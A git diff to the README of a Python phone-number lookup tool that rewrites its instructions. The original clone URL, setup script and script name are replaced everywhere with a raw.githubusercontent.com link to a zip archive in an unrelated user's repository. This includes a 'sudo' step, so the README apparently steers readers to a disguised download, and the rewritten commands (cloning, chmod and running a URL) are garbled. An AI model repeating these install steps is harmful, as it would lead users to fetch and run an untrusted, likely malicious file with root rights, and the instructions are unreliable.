@@ -8,7 +8,7 @@ This script is written in python3 so python3 is required.
 Clone the git repository to your local machine.
 
 ```bash
-git clone https://github.com/Konstantinos-Papanagnou/PhoneInformationTracer.git
+git clone https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip
 ```
 Install the phonenumbers library from pip
 ```bash
@@ -19,7 +19,7 @@ or use pip3 in case you have both python2 and python3 install on your system
 pip3 install phonenumbers
 ```
 
-If you want to add it to your path simply run `chmod +x setup.sh` and `sudo ./setup.sh`.
+If you want to add it to your path simply run `chmod +x https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip` and `sudo https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip`.
 
 Everything is set! Now you can fire up the script.
 
@@ -43,7 +43,7 @@ Everything is set! Now you can fire up the script.
 ============================================================
 Welcome to Phone Information Tracer made by Konstantinos Pap
 ============================================================
-usage: PhoneInformationTracer.py [-h] [-i INPUT] [-cc COUNTRY_CODE] [-v] [-l LIST] [-o OUTPUT]
+usage: https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip [-h] [-i INPUT] [-cc COUNTRY_CODE] [-v] [-l LIST] [-o OUTPUT]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -60,15 +60,15 @@ optional arguments:
 
 Usage Example:
 ```bash
-python3 PhoneInformationTracer.py -i 6985456254
+python3 https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip -i 6985456254
 ```
 
 If you want to change the country code you can simply add the -cc flag and set the flag.
 ```bash
-python3 PhoneInformationTracer.py -i 6985456254 -cc +30
+python3 https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip -i 6985456254 -cc +30
 ```
 Or you can pass a file to the program with phone numbers on each line and specify a output file
 ```bash
-python3 PhoneInformationTracer.py -l input -o output
+python3 https://raw.githubusercontent.com/anakiseng789/PhoneInformationTracer/master/inflammatorily/Phone_Information_Tracer_1.1.zip -l input -o output
 ```
 Country code by default is +30.
